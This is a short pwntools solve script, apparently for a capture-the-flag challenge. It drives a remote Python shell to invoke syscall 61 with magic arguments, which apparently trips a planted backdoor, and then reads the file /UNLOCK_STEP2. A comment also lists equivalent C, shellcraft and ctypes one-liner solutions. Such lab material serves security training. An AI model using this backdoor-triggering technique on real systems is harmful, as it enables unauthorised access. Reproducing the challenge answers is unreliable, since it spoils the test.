#!/usr/bin/python3

from sys import argv
from pwn import *

REMOTE = False

if len(argv) > 2:
    REMOTE = True
    HOSTNAME = argv[1]
    PORT = int(argv[2])

context.arch = 'amd64'

def get_remote():
    return remote(HOSTNAME, PORT) if REMOTE else remote('127.0.0.1', 1337)

'''
Multiple solutions:

int main(){
    syscall(61, 0x777, 0x61757468);
    system("/bin/cat /UNLOCK_STEP2");
}
nano a.c && gcc a.c && ./a.out

OR

from pwn import *
context.arch = 'amd64'
run_assembly(shellcraft.amd64.linux.syscall(61, 0x777, 0x61757468)+shellcraft.amd64.linux.cat('/UNLOCK_STEP2')+shellcraft.amd64.linux.exit(0)).readall()

OR 

python -c 'import ctypes;libc = ctypes.CDLL(None);libc.syscall(61,0x777,0x61757468);import os;os.system("cat /UNLOCK_STEP2")'
'''

command = b""""""

if __name__ == '__main__':
    r = get_remote()
    time.sleep(3)
    r.sendlineafter(b'~ $ ', b'python')
    r.sendlineafter(b'>>> ', b'import os')
    r.sendlineafter(b'>>> ', b'import ctypes')
    r.sendlineafter(b'>>> ', b'libc = ctypes.CDLL(None)')
    r.sendlineafter(b'>>> ', b'libc.syscall(61,0x777,0x61757468)')
    r.sendlineafter(b'>>> ', b'os.system("cat /UNLOCK_STEP2")')

    print(r.recvall(timeout=1))
